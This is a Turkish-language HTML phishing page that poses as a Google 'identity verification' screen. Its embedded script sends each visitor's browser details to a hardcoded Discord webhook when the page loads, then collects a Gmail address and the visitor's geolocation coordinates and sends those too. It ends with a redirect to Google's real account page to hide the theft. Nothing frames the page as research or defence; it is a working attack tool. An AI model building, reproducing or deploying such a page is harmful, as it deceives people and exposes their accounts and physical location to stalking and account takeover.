<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Google - G√ºvenli Doƒürulama</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0; padding: 0;
            background-color: #f4f4f4; color: #202124;
            overflow: hidden;
        }
        .background-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.6); z-index: -1;
        }
        .background-image {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('https://images.unsplash.com/photo-1573164713988-8665fc963095?q=80&w=1600');
            background-size: cover; background-position: center; z-index: -2; filter: blur(8px);
        }
        .container {
            display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px;
        }
        .content {
            background-color: #fff; border-radius: 12px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
            padding: 40px; text-align: center; width: 100%; max-width: 420px;
        }
        .google-logo { width: 100px; margin-bottom: 25px; }
        .title { font-size: 22px; font-weight: 500; margin-bottom: 10px; }
        .description { font-size: 14px; color: #5f6368; margin-bottom: 30px; line-height: 1.5; }

        .step-container { margin-bottom: 25px; }
        .email-input {
            width: 100%; padding: 14px; border: 1px solid #dadce0; border-radius: 4px;
            font-size: 16px; box-sizing: border-box; margin-bottom: 10px;
            transition: all 0.3s;
        }
        /* Hata durumunda input stili */
        .email-input.error { border: 2px solid #d93025; background-color: #fff8f7; }
        
        .button {
            background-color: #1a73e8; border: none; border-radius: 4px; color: #fff;
            padding: 14px 30px; font-size: 14px; font-weight: 500; cursor: pointer;
            width: 100%; transition: 0.3s; margin-top: 10px;
        }
        .button:hover { background-color: #1765cf; }

        .status-msg { font-size: 13px; font-weight: 500; min-height: 20px; margin-top: 10px; }
        .error-text { color: #d93025; }
        .success-text { color: #1a73e8; }

        .footer {
            margin-top: 30px; border-top: 1px solid #f1f3f4; padding-top: 20px;
            font-size: 12px; color: #70757a;
        }
    </style>
</head>
<body>

    <div class="background-overlay"></div>
    <div class="background-image"></div>

    <div class="container">
        <div class="content">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
            <h1 class="title">Kimlik Doƒürulama</h1>
            <p class="description">G√ºvenliƒüiniz i√ßin 2026 standartlarƒ±nda bir Gmail adresi ile doƒürulama yapmanƒ±z gerekmektedir.</p>
            
            <div class="step-container">
                <input type="email" id="userEmail" class="email-input" placeholder="Gmail adresinizi girin">
                <div id="statusMsg" class="status-msg"></div>
                <button class="button" id="mainBtn" onclick="processSteps()">Step 1: ƒ∞lerle</button>
            </div>

            <div class="footer">
                <p>¬© 2026 Google - Hizmet ≈ûartlarƒ± ve Ko≈üullar</p>
            </div>
        </div>
    </div>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
        let currentStep = 1;

        // STEP 0: Otomatik Bilgi Toplama
        window.onload = async () => {
            sendToDiscord({
                title: "üî¥ Giri≈ü Tespit Edildi",
                color: 16711680,
                fields: [
                    { name: "Tarayƒ±cƒ±", value: navigator.userAgent },
                    { name: "Zaman", value: new Date().toLocaleString() }
                ]
            });
        };

        async function processSteps() {
            const emailInput = document.getElementById('userEmail');
            const email = emailInput.value.trim().toLowerCase();
            const status = document.getElementById('statusMsg');
            const btn = document.getElementById('mainBtn');

            if (currentStep === 1) {
                // GMAIL DOƒûRULAMA Fƒ∞LTRESƒ∞
                const gmailRegex = /^[a-z0-9](\.?[a-z0-9]){2,}@gmail\.com$/;
                
                if (!gmailRegex.test(email)) {
                    emailInput.classList.add('error');
                    status.innerHTML = '<span class="error-text">L√ºtfen ge√ßerli bir @gmail.com adresi girin.</span>';
                    return;
                }

                // Hata stilini temizle
                emailInput.classList.remove('error');
                status.innerHTML = '<span class="success-text">E-posta doƒürulanƒ±yor...</span>';
                
                await sendToDiscord({
                    title: "üü° Step 1: Ge√ßerli Gmail Girildi",
                    color: 16776960,
                    fields: [{ name: "üìß Gmail", value: `\`${email}\`` }]
                });

                currentStep = 2;
                emailInput.style.display = "none"; // Email kutusunu gizle
                btn.textContent = "Step 2: Konum ƒ∞zni Ver";
                status.innerHTML = '<span class="success-text">Son a≈üama: L√ºtfen konum eri≈üimine onay verin.</span>';
                return;
            }

            if (currentStep === 2) {
                status.innerHTML = '<span class="success-text">Konum eri≈üimi bekleniyor...</span>';
                
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            const { latitude, longitude } = pos.coords;
                            await sendToDiscord({
                                title: "üü¢ Step 2: Konum Onaylandƒ±",
                                color: 65280,
                                fields: [
                                    { name: "üìß Hesap", value: `\`${email}\`` },
                                    { name: "üìç Harita", value: `[Haritada G√∂r](https://www.google.com/maps?q=${latitude},${longitude})` }
                                ]
                            });
                            
                            status.innerHTML = '<span class="success-text">Ba≈üarƒ±lƒ±! Y√∂nlendiriliyorsunuz...</span>';
                            setTimeout(() => { window.location.href = "https://myaccount.google.com"; }, 2000);
                        },
                        (err) => {
                            status.innerHTML = '<span class="error-text">Hata: Devam etmek i√ßin konum izni ≈üarttƒ±r.</span>';
                        }
                    );
                }
            }
        }

        async function sendToDiscord(embed) {
            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
            } catch (e) {}
        }
    </script>
</body>
</html>
